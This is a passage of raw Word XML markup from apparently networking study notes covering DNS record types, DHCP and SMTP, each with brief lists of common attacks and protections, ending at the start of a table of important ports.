        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc208408507"/>
      <w:r>
        <w:t>Types of DNS Records:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="220D4C02" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A → IPv4 address mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73299AA0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>AAAA → IPv6 address mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1DEB48" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CNAME → Canonical name (alias)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD7E612" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MX → Mail exchange server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A2343C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">NS → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nameserver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for a domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BA804B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>TXT → Text info (SPF, DKIM, verification)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD89450" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PTR → Reverse DNS lookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBEA8EA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SOA → Start of Authority (zone info)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3362E98F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc208408508"/>
      <w:r>
        <w:t>Security Issues &amp; Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="74A6D08A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS Cache Poisoning → Attacker injects fake IP mappings into resolver.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9B23D0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS Hijacking → Redirects domain queries to malicious servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B9A8C5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> via Amplification → Attackers exploit open resolvers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8C6EF9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">DNS Tunneling → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> data through DNS queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8A2565" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Zone Transfer Abuse → Misconfigured DNS servers leaking entire domain records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C94C7D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc208408509"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="7288251C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNSSEC (DNS Security Extensions) → Signs records to prevent tampering.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C048ADF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Split-Horizon DNS → Different records for internal vs external users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055075D7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rate-Limiting resolvers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC57113" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Monitoring for anomalies in query patterns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038FDA0C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Disable open recursive resolvers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40ACA074" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc208408510"/>
      <w:r>
        <w:t>Dynamic Host Configuration Protocol (DHCP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
    </w:p>
    <w:p w14:paraId="39944E6B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DHCP is a Layer 7 (Application Layer) protocol (though it works closely with Layer 3/4) that automatically assigns IP addresses and other network configuration parameters to devices on a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09913544" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>It eliminates the need for manual configuration, ensuring unique IP assignment within a subnet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B535BD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc208408511"/>
      <w:r>
        <w:t>How DHCP Works (DORA Process)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="1CDB6ACE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Discover</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289D1DD4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Client broadcasts a DHCP Discover message to locate servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8E2250" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Offer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC717CE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>DHCP server replies with a DHCP Offer containing IP address and configuration details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E8EAE9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7788EBDF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Client responds with a DHCP Request accepting the offer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACDB455" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Acknowledge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="208C177E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Server sends DHCP Acknowledgment (ACK) confirming the lease.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>(If denied, a NACK is sent instead.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396E04DB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc208408512"/>
      <w:r>
        <w:t>Parameters Provided by DHCP</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="4CBD155B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IP Address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE92F0F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Subnet Mask</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BF149C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Default Gateway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05868D6D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS Server(s)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EC3F87" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lease Time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234DE8F9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc208408513"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Security Issues &amp; Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="7EEF6481" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rogue DHCP Servers: Attacker runs fake DHCP server to assign malicious gateway/DNS → MITM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EFB714" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DHCP Starvation Attack: Flooding DHCP requests to exhaust IP pool (used with tools like Yersinia).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474F4AD0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Man-in-the-Middle: Redirect traffic by offering malicious configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F5F184" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc208408514"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="413F3AA2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DHCP Snooping (on switches): Trust only authorized servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B91EFC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Port Security: Limit number of MAC addresses per port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E683FD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc208408515"/>
      <w:r>
        <w:t>Simple Mail Transfer Protocol (SMTP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="17623D9B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SMTP is a Layer 7 (Application Layer) protocol used for sending emails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648D5F13" w14:textId="77777777" w:rsidR="009B2E17" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc208408516"/>
      <w:r>
        <w:t>How It Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="36C654D8" w14:textId="77777777" w:rsidR="009B2E17" w:rsidRDefault="00353410" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009B2E17">
        <w:t>Client (MUA) → Mail server (MTA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51947E64" w14:textId="77777777" w:rsidR="009B2E17" w:rsidRDefault="00353410" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009B2E17">
        <w:t>MTA relays to recipient’s server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE21BBB" w14:textId="45C27F25" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009B2E17">
        <w:t>MDA delivers to mailbox</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334EA628" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_Toc208408517"/>
      <w:r>
        <w:t>Ports:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w14:paraId="6B492279" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>25 (server-server), 587 (submission), 465 (legacy secure)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBC62E8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Commands: HELO, MAIL FROM, RCPT TO, DATA, QUIT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292B4E4D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Toc208408518"/>
      <w:r>
        <w:t>Security Issues:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
    </w:p>
    <w:p w14:paraId="7D67A8B9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Open relay abuse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC0CFB9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Spoofing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEDB243" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Phishing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DCAE2C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="_Toc208408519"/>
      <w:r>
        <w:t>Protections:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
    </w:p>
    <w:p w14:paraId="5512B529" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SPF, DKIM, DMARC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BCC44E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>STARTTLS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C3B914" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Block open relays</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9A4004" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C272467" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E77F30C" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66EE20FD" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E255B8A" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F9697C4" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14A01ED1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Toc208408520"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Important Ports</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>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7"/>
        <w:gridCol w:w="1685"/>
        <w:gridCol w:w="5348"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="71D02AB1" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E332D9C" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Port </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1905" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C698D5E" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Protocol </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="686124DD" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Service / Use </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="40F32728" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="540"/>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5A02C488" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>20, 21 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373A758A"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58BC0AB2" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>FTP (File Transfer Protocol) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w14:paraId="6D75225F" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="555"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1845" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B31F0DD" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
